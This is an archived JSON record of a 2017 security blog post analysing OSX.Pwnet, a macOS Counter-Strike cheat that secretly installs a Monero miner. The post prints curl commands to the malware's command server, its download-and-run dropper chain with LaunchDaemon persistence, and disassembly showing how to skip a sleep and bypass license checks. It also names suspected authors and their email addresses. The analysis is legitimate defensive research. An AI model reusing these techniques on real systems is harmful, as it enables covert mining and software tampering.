{
    "id": "eb22ef14-77a0-40bd-9ed3-7f65257b8583",
    "created_at": "2023-01-12T15:07:42.837999Z",
    "updated_at": "2025-03-27T02:05:20.060414Z",
    "deleted_at": null,
    "sha1_hash": "b7f73cea228a3d57130a0db3a37faca4aafc16e9",
    "title": "2017-08-23 - CSGO Hacks for Mac That You Shouldnt Trust",
    "authors": "",
    "file_creation_date": "2022-05-25T14:36:45Z",
    "file_modification_date": "2022-05-25T14:36:45Z",
    "file_size": 381216,
    "plain_text": "# CS:GO Hacks for Mac That You Shouldn’t Trust\n\n**[sentinelone.com/blog/osx-pwnet-a-csgo-hack-and-sneaky-miner](https://www.sentinelone.com/blog/osx-pwnet-a-csgo-hack-and-sneaky-miner/)**\n\n[(Photo source: Pony Strike: Global Offense by FilipinoNinja95)](https://filipinoninja95.deviantart.com/art/Pony-Strike-Global-Offense-324156591)\n\n\nAugust 23, 2017\n\n\n[We recently found Counter-Strike: Global Offensive (CS: Go) hacks on macOS that is also a](https://en.wikipedia.org/wiki/Counter-Strike:_Global_Offensive)\n**trojan that could mine CryptoCurrencies without user consent.**\n\nAccording to VirusTotal Retrohunt, the threat is in the wild since the beginning of July 2017.\n\n**Warning: At the time of this writing, all URLs are live.**\n\n## Entry Point: Vlone.cc Portal\n\n[The entry point is vlone.cc portal, where a user can Register,](https://vlone.cc/) [Login and Download for free the](https://vlone.cc/portal/index.php?page=login)\nhack installer.\n\nThe domain name was registered through eNom in April 2017, 14th, and resolves to a shared\nweb host at namecheap:\n```\n$ dig vlone.cc +short\n198.54.115.80\n$ dig -x 198.54.115.80 +short \nserver205-2.web-hosting.com.\n\n```\nHTTPS certificate was delivered by COMODO PositiveSSL in June 2017, 27th.\n\n[When logged in, members can browse the Prices page and purchase a premium subscription](https://vlone.cc/portal/index.php?page=prices)\n[for 1, 3 or 6 months through Selly:](https://selly.gg/u/pwned)\n\n\n-----\n\nMembers download the same archive of the free installer than guests:\n```\n$ curl -s https://vlone.cc/portal/download.php | shasum -a 256\nb1bdb4502f5051309582f72a62c14d9919d3c86de3dcfa0b3a5f008cb5a018fe $ curl -s https://vlone.cc/portal/download.php -G -d user=1234 -d free | shasum -a\n256\nb1bdb4502f5051309582f72a62c14d9919d3c86de3dcfa0b3a5f008cb5a018fe \n```\nAccording to the `user GET query value, members count in August 2017, 22nd, is nearly two`\nthousand.\n\nWe don’t know if the private installer of the hack also installs the mining software without\nuser consent.\n\n## Binaries analysis\n\n[It’s all C++ Standard Library code. Network connections use libcurl and secure HTTPS](https://curl.haxx.se/libcurl/)\nprotocol.\n\nAll executables, but the miner CLI, require super-user privileges, so the user must run the\n_installer with_ `sudo :`\n```\n$ ./vHook \nRoot access required!\nPlease type \"sudo ./vhook\"\n\n```\n[The main binary hides itself as Dynamic Web TWAIN, an online document scanning](http://www.dynamsoft.com/Products/WebTWAIN_Overview.aspx)\nplatform.\n\n### vHook\n\n\n-----\n\n```\nvHook is the installer. It is packed with UPX, probably to avoid user analysis and bypass\n\n```\nsome security products.\n\nIt is a command line interface:\n```\n$ sudo ./vHook \n[vlone] vHook public [vlone]\nUsername: USERNAME\nPassword: PASSWORD\n[vlone] Welcome to vHook Public, USERNAME!\n[vlone] Downloading vHook assets..\n[vlone] Inflating vHook assets..\n[vlone] CS:GO is not running!\n[vlone] Cleaning up..\n[vlone] Quitting...\n\n```\nWith a valid member account, it downloads and extracts `bootstrap.dylib and`\n```\nvhook.dylib from https://vlone.cc/portal/gateway.php as assets.zip to\n/Library/Application Support/ :\n$ curl -s https://vlone.cc/portal/gateway.php -G -d username=USERNAME -d\npassword=PASSWORD -d free | xxd -l 64\n00000000: 504b 0304 1400 0000 0800 8696 c14a 9c2e PK...........J..\n00000010: 55c2 b606 0000 1827 0000 0f00 1c00 626f U......'......bo\n00000020: 6f74 7374 7261 702e 6479 6c69 6255 5409 otstrap.dylibUT.\n00000030: 0003 9cb9 2f59 d339 8059 7578 0b00 0104 ..../Y.9.Yux....\n\n```\nIt loads `bootstrap.dylib from` [osxinj project. If Counter-Strike: Global Offensive is](https://github.com/scen/osxinj)\nrunning, it downloads and extracts some fonts ( https://vlone.cc/fontfix.zip as\n```\nvlone.zip to /Library/Fonts/ ), and injects vhook.dylib into csgo_osx64 process.\n\n```\nIt could be a perfect deal for a CS: GO user, but it turns out `vHook also sneaky downloads`\nand extracts `https://vlone.cc/abc/assets/asset.zip as` `fonts.zip to` `/var/,`\nchanges directory to `/var and runs` `sudo ./helper & .`\n\nIt then kills Terminal application to hide the detached process output.\n\n### helper\n```\nhelper is the miner downloader dropper. It is also packed with UPX.\n\n```\nIt first asks the C&C server for the name of the binary to execute upon download:\n```\n$ curl https://www.vlone.cc/abc/commands/update.php?request -F command=newfile\ncom.dynamsoft.webhelper\n\n```\nIt downloads `https://www.vlone.cc/abc/assets/b.zip as` `/b.zip, extracts its`\ncontents to `/var/.log/, changes directory to` `/var/.log/ and runs` `sudo`\n\n\n-----\n\nAt the time of this writing, `https://www.vlone.cc/abc/assets/b.zip URL response is a`\n_File Not Found 404 error code, but_ `https://www.vlone.cc/abc/assets/bz.zip URL is`\nlive and send the expected archive.\n\n### com.dynamsoft.WebHelper\n```\ncom.dynamsoft.WebHelper is the miner downloader. Despite the name, it is not related to\n\n```\nDynamsoft.\n\nIt starts by downloading and extracting:\n```\n   WebTwainService from https://www.vlone.cc/abc/assets/d.zip to\n   /var/.log/\n   com.dynamsoft.WebTwainService.plist from\n   https://www.vlone.cc/abc/assets/p.zip to /Library/LaunchDaemons/\n\n```\nIt loads the daemon, sends computer unique identifier (UUID) and its version to C&C server,\nand checks if it `meetsRequirements(), i.e. running as` `root and not in a debugger:`\n```\n$ curl -s https://www.vlone.cc/abc/hub.php?init -F version=1.2.1 -F hwid=$(uuidgen)\ncreated continue\n\n```\nIt then sleeps for one hour. If one is in a hurry, he or she can cut out the nap easily:\n```\n__text:0000000100016A5F BF 01 00 00 00 mov edi, 1800 ; unsigned int\n__text:0000000100016A64 E8 5B 72 00 00 call _sleep\n\n```\nOnce rested, it sends commands to C&C server every minute to ask if it should mine and\nupdate or kill itself:\n```\n$ curl -s https://www.vlone.cc/abc/commands/mine.php?request -F command=mine\ntrue\n$ curl -s https://www.vlone.cc/abc/commands/update.php?request -F command=update\nfalse\n$ curl -s https://www.vlone.cc/abc/commands/kill.php?request -F command=kill\nfalse\n\n```\nEvery minute, it also creates or updates the mining thread to:\n\ndownload and extract `https://www.vlone.cc/abc/assets/helper.zip to`\n```\n   /var/.trash/.assets/\n\n```\nget miner settings (maximum core number, currency, email address)\ncheck if Activity Monitor is running\ncheck if it is already mining\ncheck if it should stop mining\nrun `cd /var/.trash/.assets/; ./com.apple.SafariHelper with appropriate`\narguments\n\n\n-----\n\n[Read more: SENTINELONE – THE BEST AV FOR MACOS](https://www.sentinelone.com/blog/sentinelone-best-av-macos/)\n\n### WebTwainService\n```\nWebTwainService tries to take care of com.dynamsoft.webhelper persistency. It is again\n\n```\npacked with UPX.\n\nIt sets its current directory to `/var/.log and runs` `sudo ./com.dynamsoft.webhelper`\n```\n&, then recursively sleeps for one hour…\n\n### minergate-cli\ncom.apple.SafariHelper actually is the official MinerGate CLI v4.04:\n$ shasum -a 256 MinerGate-cli-4.04-Mac/minergate-cli com.apple.SafariHelper\nb943369a2ae7afb3522f3b1c40c15208bff0444d47d0df476dd585cf9cbf7c10 MinerGate-cli-4.04Mac/minergate-cli\nb943369a2ae7afb3522f3b1c40c15208bff0444d47d0df476dd585cf9cbf7c10\ncom.apple.SafariHelper\n\n```\n[It is written in Qt, so it comes with frameworks:](https://www.qt.io/)\n```\n$ find /private/.trash -type f\n/private/.trash/.assets/com.apple.SafariHelper\n/private/.trash/.assets/Frameworks/QtCore.framework/Versions/5/QtCore\n/private/.trash/.assets/Frameworks/QtNetwork.framework/Versions/5/QtNetwork\n/private/.trash/.assets/Frameworks/QtSql.framework/Versions/5/QtSql\n/private/.trash/.assets/Frameworks/QtWebSockets.framework/Versions/5/QtWebSockets\n\n```\nIt takes as CPU as requested by `com.dynamsoft.WebHelper so the user enjoys the delight`\nof computer’s fans background music:\n```\n$ ps axu | grep [c]om.apple.SafariHelper\nroot 474 200.0 0.2 2490592 14204 s000 R+ 3:07AM 3:21.87 ./com.apple.SafariHelper user pwnedboi@protonmail.com --xmr 2\n\n```\n[In this example, it is mining Monero (XMR) with all virtual machine cores (two: 200.0%).](https://coinmarketcap.com/currencies/monero/)\n\nCurrent MinerGate email address is `pwnedboi@protonmail.com, and`\n```\nxxanax420@gmail.com email address was also found hardcoded in another sample.\n\n```\nMaximum core number, CryptoCurrency and email address are provided by\n```\ncom.dynamsoft.WebHelper and the C&C server:\n$ curl -s https://www.vlone.cc/abc/commands/mine.php?request -F mine=cores\n4\n$ curl -s https://www.vlone.cc/abc/commands/mine.php?request -F mine=coin\nxmr\n$ curl -s https://www.vlone.cc/abc/commands/mine.php?request -F mine=email\npwnedboi@protonmail.com\n\n```\n\n-----\n\n### vLoader\n\nWe finally ended up with `vLoader, the private installer, and, once more, it is packed with`\nUPX.\n\nIt does many checks against the C&C server:\n```\n$ curl -s https://www.vlone.cc/pwned.php -F user=USERNAME -F pass=PASSWORD -F\nhwid=$(uuidgen)\n204\n$ curl -s https://www.vlone.cc/sub.php -F user=USERNAME\n00/00/0000\n\n```\nThey are trivial to bypass for anyone who can force a conditional jump:\n```\n__text:0000000100010570 A8 01 test al, 1\n__text:0000000100010572 90 E9 05 00 00 00 jnz loc_10001057D\n__text:0000000100010578 E9 08 01 00 00 jmp loc_100010685\n__text:000000010001057D ; -------------------------------------------------------------------------__text:000000010001057D\n__text:000000010001057D loc_10001057D: ; CODE XREF: dna8o::in(void)+862\n__text:000000010001057D 48 8B 3D 94 5A 00 00 mov rdi, cs:__ZNSt3__14coutE_ptr\n__text:0000000100010584 48 8D 35 84 53 00 00 lea rsi, aLoggedInSucces ; \"Logged in\nsuccessfully\"\n\n```\n_Private payloads are downloaded and extracted to_ `/var/.old/ :`\n```\n   boots.dylib from http://vlone.cc/clear/sadmio.zip\n   .uhdexter.dylib from http://vlone.cc/clear/getout.zip\n\n```\nCompared to the free injected library, the private hook is very similar:\n\n\n-----\n\n```\nvLoader doesn t uninstall any of the free version naughty payloads.\n\n## Finn and ponies\n\n```\nWe didn’t spend too much time reverse engineering `vhook.dylib . The source code was`\n[available on GitHub (archive) and videos of the hack are also available on YouTube here and](https://github.com/fetusfinn/vHook)\n[there.](https://www.youtube.com/watch?v=F2o0qjC6TAI)\n\n[GitHub owner of the vHook project is fetusfinn (original author is ViKiNG) and we](https://github.com/fetusfinn/vHook/commit/baff8d7b4c9625a9437bd22593a7dc7550eb6dcb)\ncoincidentally found debugger symbols matching Finn username in GitHub’s\n```\nlibvHook.dylib and in all analyzed binaries:\n$ for f in github.com/fetusfinn/vHook/libvHook.dylib \\\n vHook_unpacked helper_unpacked com.dynamsoft.WebHelper WebTwainService_unpacked\ndo\n nm -a \"$f\" | grep -m 1 Finn\ndone\n0000000000000000 - 00 0000 SO /Users/Finn/Desktop/c++/vHook/\n0000000000000000 - 00 0000 SO /Users/Finn/Downloads/Archive/vloneLoader/\n0000000000000000 - 00 0000 SO\n/Users/Finn/Desktop/pwnednet/pwnednet/installer/installer/\n0000000000000000 - 00 0000 SO /Users/Finn/Desktop/pwnednet/pwnednet/pwnednet/\n0000000000000000 - 00 0000 SO\n/Users/Finn/Downloads/WebTwainService/WebTwainService/WebTwainService/\n\n```\nThis is how we know Finn’s project name is `pwnednet . Shortened to pwnet, it sounds like`\n**poney in French, i.e. pony in English and, everybody loves ponies, so here you have**\n**OSX.Pwnet.A!**\n\nThere also is a reference to someone named Jennifer Johansson in Xcode user data:\n```\n$ find github.com/fetusfinn/vHook -type f -path \"*nnif*\"\ngithub.com/fetusfinn/vHook/vHook.xcodeproj/xcuserdata/jenniferjohansson.xcuserdatad/xc\ngithub.com/fetusfinn/vHook/vHook.xcodeproj/xcuserdata/jenniferjohansson.xcuserdatad/xc\ngithub.com/fetusfinn/vHook/vHook.xcodeproj/xcuserdata/jenniferjohansson.xcuserdatad/xc\n\n```\nWe didn’t take the time to ask pwned’s boyfriend on Discord if Finn is much into ponies:\n\n\n-----\n\n[But, just in case, here is a Dutch Pony for Finn and her team.](https://commons.wikimedia.org/wiki/File:Dutch_dwarf_horse.jpg)\n\nFrom Hackestria with ❤\n\nEDIT: added vLoader on 2017/08/29.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-08-23 - CSGO Hacks for Mac That You Shouldnt Trust.pdf"
    ],
    "report_names": [
        "2017-08-23 - CSGO Hacks for Mac That You Shouldnt Trust.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536062,
    "ts_updated_at": 1743041120,
    "ts_creation_date": 1653489405,
    "ts_modification_date": 1653489405,
    "files": {
        "pdf": "https://archive.orkl.eu/b7f73cea228a3d57130a0db3a37faca4aafc16e9.pdf",
        "text": "https://archive.orkl.eu/b7f73cea228a3d57130a0db3a37faca4aafc16e9.txt",
        "img": "https://archive.orkl.eu/b7f73cea228a3d57130a0db3a37faca4aafc16e9.jpg"
    }
}